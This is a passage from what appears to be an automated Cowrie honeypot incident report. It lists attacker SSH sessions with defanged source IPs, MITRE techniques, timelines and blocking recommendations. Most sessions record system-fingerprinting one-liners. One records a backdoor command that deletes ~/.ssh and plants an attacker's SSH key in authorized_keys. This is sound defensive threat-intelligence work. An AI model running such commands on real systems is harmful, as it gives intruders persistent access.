| `2026-07-31 18:58:53` | `cowrie.command.input` |
| `2026-07-31 18:58:55` | `cowrie.log.closed` |
| `2026-07-31 18:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecac744ed293

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 18:59 |
| **Last Seen** | 2026-07-31 19:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 18:59:57` | `cowrie.session.connect` |
| `2026-07-31 18:59:57` | `cowrie.client.version` |
| `2026-07-31 18:59:57` | `cowrie.client.kex` |
| `2026-07-31 18:59:58` | `cowrie.login.success` |
| `2026-07-31 19:00:00` | `cowrie.session.params` |
| `2026-07-31 19:00:00` | `cowrie.command.input` |
| `2026-07-31 19:00:00` | `cowrie.command.input` |
| `2026-07-31 19:00:00` | `cowrie.command.input` |
| `2026-07-31 19:00:00` | `cowrie.command.input` |
| `2026-07-31 19:00:00` | `cowrie.command.input` |
| `2026-07-31 19:00:00` | `cowrie.command.success` |
| `2026-07-31 19:00:00` | `cowrie.command.input` |
| `2026-07-31 19:00:00` | `cowrie.command.input` |
| `2026-07-31 19:00:00` | `cowrie.command.input` |
| `2026-07-31 19:00:00` | `cowrie.command.input` |
| `2026-07-31 19:00:00` | `cowrie.log.closed` |
| `2026-07-31 19:00:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81ab4329d23e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:01 |
| **Last Seen** | 2026-07-31 19:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:01:59` | `cowrie.session.connect` |
| `2026-07-31 19:02:00` | `cowrie.client.version` |
| `2026-07-31 19:02:00` | `cowrie.client.kex` |
| `2026-07-31 19:02:01` | `cowrie.login.success` |
| `2026-07-31 19:02:02` | `cowrie.session.params` |
| `2026-07-31 19:02:02` | `cowrie.command.input` |
| `2026-07-31 19:02:02` | `cowrie.command.input` |
| `2026-07-31 19:02:02` | `cowrie.command.input` |
| `2026-07-31 19:02:02` | `cowrie.command.input` |
| `2026-07-31 19:02:02` | `cowrie.command.input` |
| `2026-07-31 19:02:02` | `cowrie.command.success` |
| `2026-07-31 19:02:02` | `cowrie.command.input` |
| `2026-07-31 19:02:02` | `cowrie.command.input` |
| `2026-07-31 19:02:02` | `cowrie.command.input` |
| `2026-07-31 19:02:02` | `cowrie.command.input` |
| `2026-07-31 19:02:03` | `cowrie.log.closed` |
| `2026-07-31 19:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6a51a573196

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 19:02 |
| **Last Seen** | 2026-07-31 19:02 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:02:01` | `cowrie.session.connect` |
| `2026-07-31 19:02:02` | `cowrie.client.version` |
| `2026-07-31 19:02:02` | `cowrie.client.kex` |
| `2026-07-31 19:02:10` | `cowrie.login.success` |
| `2026-07-31 19:02:14` | `cowrie.session.params` |
| `2026-07-31 19:02:14` | `cowrie.command.input` |
| `2026-07-31 19:02:14` | `cowrie.command.input` |
| `2026-07-31 19:02:14` | `cowrie.command.input` |
| `2026-07-31 19:02:14` | `cowrie.command.input` |
| `2026-07-31 19:02:14` | `cowrie.command.input` |
| `2026-07-31 19:02:14` | `cowrie.command.success` |
| `2026-07-31 19:02:14` | `cowrie.command.input` |
| `2026-07-31 19:02:14` | `cowrie.command.input` |
| `2026-07-31 19:02:14` | `cowrie.command.input` |
| `2026-07-31 19:02:14` | `cowrie.command.input` |
| `2026-07-31 19:02:16` | `cowrie.log.closed` |
| `2026-07-31 19:02:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a061c5c91c6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:04 |
| **Last Seen** | 2026-07-31 19:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:04:00` | `cowrie.session.connect` |
| `2026-07-31 19:04:00` | `cowrie.client.version` |
| `2026-07-31 19:04:00` | `cowrie.client.kex` |
| `2026-07-31 19:04:00` | `cowrie.login.success` |
| `2026-07-31 19:04:02` | `cowrie.session.params` |
| `2026-07-31 19:04:02` | `cowrie.command.input` |
| `2026-07-31 19:04:02` | `cowrie.command.input` |
| `2026-07-31 19:04:02` | `cowrie.command.input` |
| `2026-07-31 19:04:02` | `cowrie.command.input` |
| `2026-07-31 19:04:02` | `cowrie.command.input` |
| `2026-07-31 19:04:02` | `cowrie.command.success` |
| `2026-07-31 19:04:02` | `cowrie.command.input` |
| `2026-07-31 19:04:02` | `cowrie.command.input` |
| `2026-07-31 19:04:02` | `cowrie.command.input` |
| `2026-07-31 19:04:02` | `cowrie.command.input` |
| `2026-07-31 19:04:02` | `cowrie.log.closed` |
| `2026-07-31 19:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f6445feeb3

| Field | Detail |
|---|---|
| **Source IP** | `218.149.235[.]152` |
| **First Seen** | 2026-07-31 19:05 |
| **Last Seen** | 2026-07-31 19:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:05:02` | `cowrie.session.connect` |
| `2026-07-31 19:05:03` | `cowrie.client.version` |
| `2026-07-31 19:05:03` | `cowrie.client.kex` |
| `2026-07-31 19:05:05` | `cowrie.login.success` |
| `2026-07-31 19:05:06` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `218.149.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe60cc218cea

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]220` |
| **First Seen** | 2026-07-31 19:05 |
| **Last Seen** | 2026-07-31 19:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:05:06` | `cowrie.session.connect` |
| `2026-07-31 19:05:06` | `cowrie.login.success` |
| `2026-07-31 19:05:07` | `cowrie.session.params` |
| `2026-07-31 19:05:07` | `cowrie.command.input` |
| `2026-07-31 19:05:08` | `cowrie.command.input` |
| `2026-07-31 19:05:08` | `cowrie.command.input` |
| `2026-07-31 19:05:09` | `cowrie.command.input` |
| `2026-07-31 19:05:09` | `cowrie.command.failed` |
| `2026-07-31 19:05:10` | `cowrie.log.closed` |
| `2026-07-31 19:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]220` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5bda426228d

| Field | Detail |
|---|---|
| **Source IP** | `122.160.142[.]194` |
| **First Seen** | 2026-07-31 19:05 |
| **Last Seen** | 2026-07-31 19:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:05:11` | `cowrie.session.connect` |
| `2026-07-31 19:05:12` | `cowrie.client.version` |
| `2026-07-31 19:05:12` | `cowrie.client.kex` |
| `2026-07-31 19:05:14` | `cowrie.login.success` |
| `2026-07-31 19:05:15` | `cowrie.direct-tcpip.request` |
| `2026-07-31 19:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.142[.]194` to AbuseIPDB if not already reported
- [ ] Block `122.160.142[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbb8fe11a571

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 19:05 |
| **Last Seen** | 2026-07-31 19:05 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:05:14` | `cowrie.session.connect` |
| `2026-07-31 19:05:15` | `cowrie.client.version` |
| `2026-07-31 19:05:15` | `cowrie.client.kex` |
| `2026-07-31 19:05:22` | `cowrie.login.success` |
| `2026-07-31 19:05:26` | `cowrie.session.params` |
| `2026-07-31 19:05:26` | `cowrie.command.input` |
| `2026-07-31 19:05:26` | `cowrie.command.input` |
| `2026-07-31 19:05:26` | `cowrie.command.input` |
| `2026-07-31 19:05:26` | `cowrie.command.input` |
| `2026-07-31 19:05:26` | `cowrie.command.input` |
| `2026-07-31 19:05:26` | `cowrie.command.success` |
| `2026-07-31 19:05:26` | `cowrie.command.input` |
| `2026-07-31 19:05:26` | `cowrie.command.input` |
| `2026-07-31 19:05:26` | `cowrie.command.input` |
| `2026-07-31 19:05:26` | `cowrie.command.input` |
| `2026-07-31 19:05:28` | `cowrie.log.closed` |
| `2026-07-31 19:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c85bea9b14d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:05 |
| **Last Seen** | 2026-07-31 19:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:05:57` | `cowrie.session.connect` |
| `2026-07-31 19:05:57` | `cowrie.client.version` |
| `2026-07-31 19:05:57` | `cowrie.client.kex` |
| `2026-07-31 19:05:58` | `cowrie.login.success` |
| `2026-07-31 19:06:00` | `cowrie.session.params` |
| `2026-07-31 19:06:00` | `cowrie.command.input` |
| `2026-07-31 19:06:00` | `cowrie.command.input` |
| `2026-07-31 19:06:00` | `cowrie.command.input` |
| `2026-07-31 19:06:00` | `cowrie.command.input` |
| `2026-07-31 19:06:00` | `cowrie.command.input` |
| `2026-07-31 19:06:00` | `cowrie.command.success` |
| `2026-07-31 19:06:00` | `cowrie.command.input` |
| `2026-07-31 19:06:00` | `cowrie.command.input` |
| `2026-07-31 19:06:00` | `cowrie.command.input` |
| `2026-07-31 19:06:00` | `cowrie.command.input` |
| `2026-07-31 19:06:00` | `cowrie.log.closed` |
| `2026-07-31 19:06:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec79d90b7657

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:07 |
| **Last Seen** | 2026-07-31 19:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:07:56` | `cowrie.session.connect` |
| `2026-07-31 19:07:56` | `cowrie.client.version` |
| `2026-07-31 19:07:56` | `cowrie.client.kex` |
| `2026-07-31 19:07:57` | `cowrie.login.success` |
| `2026-07-31 19:07:59` | `cowrie.session.params` |
| `2026-07-31 19:07:59` | `cowrie.command.input` |
| `2026-07-31 19:07:59` | `cowrie.command.input` |
| `2026-07-31 19:07:59` | `cowrie.command.input` |
| `2026-07-31 19:07:59` | `cowrie.command.input` |
| `2026-07-31 19:07:59` | `cowrie.command.input` |
| `2026-07-31 19:07:59` | `cowrie.command.success` |
| `2026-07-31 19:07:59` | `cowrie.command.input` |
| `2026-07-31 19:07:59` | `cowrie.command.input` |
| `2026-07-31 19:07:59` | `cowrie.command.input` |
| `2026-07-31 19:07:59` | `cowrie.command.input` |
| `2026-07-31 19:07:59` | `cowrie.log.closed` |
| `2026-07-31 19:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-008835aa29cb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 19:08 |
| **Last Seen** | 2026-07-31 19:08 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:08:36` | `cowrie.session.connect` |
| `2026-07-31 19:08:37` | `cowrie.client.version` |
| `2026-07-31 19:08:37` | `cowrie.client.kex` |
| `2026-07-31 19:08:42` | `cowrie.login.success` |
| `2026-07-31 19:08:46` | `cowrie.session.params` |
| `2026-07-31 19:08:46` | `cowrie.command.input` |
| `2026-07-31 19:08:46` | `cowrie.command.input` |
| `2026-07-31 19:08:46` | `cowrie.command.input` |
| `2026-07-31 19:08:46` | `cowrie.command.input` |
| `2026-07-31 19:08:46` | `cowrie.command.input` |
| `2026-07-31 19:08:46` | `cowrie.command.success` |
| `2026-07-31 19:08:46` | `cowrie.command.input` |
| `2026-07-31 19:08:46` | `cowrie.command.input` |
| `2026-07-31 19:08:46` | `cowrie.command.input` |
| `2026-07-31 19:08:46` | `cowrie.command.input` |
| `2026-07-31 19:08:48` | `cowrie.log.closed` |
| `2026-07-31 19:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d4e28a9dd96

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:09 |
| **Last Seen** | 2026-07-31 19:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:09:53` | `cowrie.session.connect` |
| `2026-07-31 19:09:53` | `cowrie.client.version` |
| `2026-07-31 19:09:53` | `cowrie.client.kex` |
| `2026-07-31 19:09:54` | `cowrie.login.success` |
| `2026-07-31 19:09:55` | `cowrie.session.params` |
| `2026-07-31 19:09:55` | `cowrie.command.input` |
| `2026-07-31 19:09:55` | `cowrie.command.input` |
| `2026-07-31 19:09:55` | `cowrie.command.input` |
| `2026-07-31 19:09:55` | `cowrie.command.input` |
| `2026-07-31 19:09:55` | `cowrie.command.input` |
| `2026-07-31 19:09:55` | `cowrie.command.success` |
| `2026-07-31 19:09:55` | `cowrie.command.input` |
| `2026-07-31 19:09:55` | `cowrie.command.input` |
| `2026-07-31 19:09:55` | `cowrie.command.input` |
| `2026-07-31 19:09:55` | `cowrie.command.input` |
| `2026-07-31 19:09:56` | `cowrie.log.closed` |
| `2026-07-31 19:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a478a27f2a9

| Field | Detail |
|---|---|
| **Source IP** | `180.184.183[.]66` |
| **First Seen** | 2026-07-31 19:10 |
| **Last Seen** | 2026-07-31 19:15 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:10:16` | `cowrie.session.connect` |
| `2026-07-31 19:10:16` | `cowrie.client.version` |
| `2026-07-31 19:10:16` | `cowrie.client.kex` |
| `2026-07-31 19:10:17` | `cowrie.login.success` |
| `2026-07-31 19:10:18` | `cowrie.session.params` |
| `2026-07-31 19:10:18` | `cowrie.command.input` |
| `2026-07-31 19:10:18` | `cowrie.command.failed` |
| `2026-07-31 19:10:18` | `cowrie.log.closed` |
| `2026-07-31 19:10:19` | `cowrie.session.params` |
| `2026-07-31 19:10:19` | `cowrie.command.input` |
| `2026-07-31 19:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.183[.]66` to AbuseIPDB if not already reported
- [ ] Block `180.184.183[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca3c26916c11

| Field | Detail |
|---|---|
| **Source IP** | `180.184.183[.]66` |
| **First Seen** | 2026-07-31 19:10 |
| **Last Seen** | 2026-07-31 19:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 19:10:47` | `cowrie.session.connect` |
| `2026-07-31 19:10:47` | `cowrie.client.version` |
| `2026-07-31 19:10:47` | `cowrie.client.kex` |
| `2026-07-31 19:10:48` | `cowrie.login.success` |
| `2026-07-31 19:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.183[.]66` to AbuseIPDB if not already reported
- [ ] Block `180.184.183[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dee8ee05a91

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-31 19:11 |
| **Last Seen** | 2026-07-31 19:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
